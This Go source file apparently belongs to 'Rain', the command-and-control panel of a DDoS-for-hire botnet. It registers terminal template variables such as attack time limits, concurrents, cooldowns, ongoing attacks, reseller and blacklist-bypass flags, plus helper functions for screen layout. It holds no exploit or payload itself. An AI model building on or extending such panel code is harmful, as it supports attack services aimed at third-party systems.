package Term

import (
	"io"
	"strconv"
	"strings"
	"time"
	"runtime"

	viewsMapped "Rain/core/config/views"
	Termfx "Rain/core/config/views/tfx"
	Database "Rain/core/database"
	ParseJson "Rain/core/functions/json"
	Util "Rain/core/functions/util"
	Sessions "Rain/core/masters/sessions"
)

var Pos1 string
var Pos2 string

var Pos3 string
var Pos4 string

func Standard_Struct(Cli *Termfx.Registry, User *Database.User_Struct, Colourise bool, Custom map[string]string) *Termfx.Registry {

	dt := time.Now()

	for Term, CliMap := range Custom {
		Cli.RegisterVariable(Term, CliMap)
	}
	Cli.RegisterVariable("username", User.Username)

	lol := time.Duration(time.Until(time.Unix(User.Expiry, 0))).Hours() / 24
	Cli.RegisterVariable("days_left", strconv.FormatFloat(lol, 'f', 2, 64))

	Cli.RegisterVariable("admin", Util.ColourizeBoolen(User.Admin, Colourise))
	Cli.RegisterVariable("reseller", Util.ColourizeBoolen(User.Reseller, Colourise))
	Cli.RegisterVariable("banned", Util.ColourizeBoolen(User.Banned, Colourise))
	Cli.RegisterVariable("vip", Util.ColourizeBoolen(User.VIP, Colourise))
	Cli.RegisterVariable("raw", Util.ColourizeBoolen(User.Raw, Colourise))
	Cli.RegisterVariable("holder", Util.ColourizeBoolen(User.Holder, Colourise))
	Cli.RegisterVariable("newuser", Util.ColourizeBoolen(User.Newuser, Colourise))
	Cli.RegisterVariable("mfa", Util.ColourizeBoolen(User.MFA, Colourise))
	Cli.RegisterVariable("bypassblacklist", Util.ColourizeBoolen(User.Bypassblacklist, Colourise))
	Cli.RegisterVariable("powersaving", Util.ColourizeBoolen(User.Powersaving, Colourise))

	Cli.RegisterVariable("maxsessions", strconv.Itoa(User.MaxSessions))
	Cli.RegisterVariable("maxtime", strconv.Itoa(User.MaxTime))
	Cli.RegisterVariable("cooldown", strconv.Itoa(User.Cooldown))
	Cli.RegisterVariable("concurrents", strconv.Itoa(User.Concurrents))

	Cli.RegisterVariable("date", time.Now().Format("Mon Jan _2 15:04:05 2006"))

	MyRunning, _ := Database.GetRunningUser(User.Username)
	Cli.RegisterVariable("myongoing", strconv.Itoa(MyRunning))
	Ongoing, _ := Database.Ongoing(User.Username)
	Cli.RegisterVariable("ongoing", strconv.Itoa(len(Ongoing)))

	Cli.RegisterVariable("online", strconv.Itoa(len(Sessions.Sessions)))

	Cli.RegisterVariable("cnc", ParseJson.ConfigParse.App.AppName)

	Cli.RegisterFunction("sleep", func(session io.Writer, args string) (int, error) {
		GetINT, error := strconv.Atoi(args)
		if error != nil {
			return 0, error
		}
		time.Sleep(time.Duration(GetINT) * time.Millisecond)
		return 0, nil
	})

	Cli.RegisterFunction("clear", func(session io.Writer, args string) (int, error) {

		return session.Write([]byte("\033[2J\033[;H"))
	})

	Cli.RegisterFunction("include", func(session io.Writer, args string) (int, error) {

		BrandingMap := viewsMapped.Branding[args]
		if BrandingMap == "" {
			return session.Write([]byte("$[Failed to find file]#"))
		}

		return session.Write([]byte(string(BrandingMap)))

	})

	Cli.RegisterFunction("time", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(dt.Format("15:04:05")))
	})

	Cli.RegisterFunction("usernameposition", func(session io.Writer, args string) (int, error) {
		a := strings.Split(args, ",")
		Pos1 = a[0]
		Pos2 = a[1]
		return 0, nil
	})

	Cli.RegisterFunction("passwordposition", func(session io.Writer, args string) (int, error) {
		a := strings.Split(args, ",")
		Pos3 = a[0]
		Pos4 = a[1]
		return 0, nil
	})

	Cli.RegisterFunction("newpwdposition", func(session io.Writer, args string) (int, error) {
		a := strings.Split(args, ",")
		Pos1 = a[0]
		Pos2 = a[1]
		return 0, nil
	})

	Cli.RegisterFunction("cnewpwdposition", func(session io.Writer, args string) (int, error) {
		a := strings.Split(args, ",")
		Pos3 = a[0]
		Pos4 = a[1]
		return 0, nil
	})

	Cli.RegisterVariable("os", GetOS())

	return Cli
}

func GetOS() string {
	if runtime.GOOS == "windows" {
		OS := "Windows"
		return OS
	} 
	if runtime.GOOS == "linux" {
		OS := "Linux"
		return OS
	}
	if runtime.GOOS == "darwin" {
		OS := "Mac OS"
		return OS
	}
	return "Unknown"
}

